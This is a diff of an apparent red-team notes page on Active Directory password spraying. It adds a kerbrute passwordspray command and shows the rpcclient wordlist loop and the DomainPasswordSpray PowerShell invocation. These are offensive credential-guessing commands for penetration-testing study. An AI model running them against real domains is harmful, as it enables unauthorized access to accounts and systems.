@@ -54,9 +54,17 @@ $ for u in $(cat wordlist);do rpcclient -U "$u%PasswordHere" -c "getusername;qui
 
 You may use [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) <small>(1.6k ⭐)</small>:
 
-```
+```ps
 PS> Import-Module .\DomainPasswordSpray.ps1
 PS> Invoke-DomainPasswordSpray -Password PasswordHere -OutFile output.txt -ErrorAction SilentlyContinue
+```
+
+#### Leveraging Kerberos Authentication Module
+
+We can use [kerbrute](/cybersecurity/red-team/tools/utilities/windows/kerbrute.md):
+
+```ps
+$ kerbrute passwordspray -d domain --dc IP valid_users.txt mypassword
 ```
 </div></div>
 
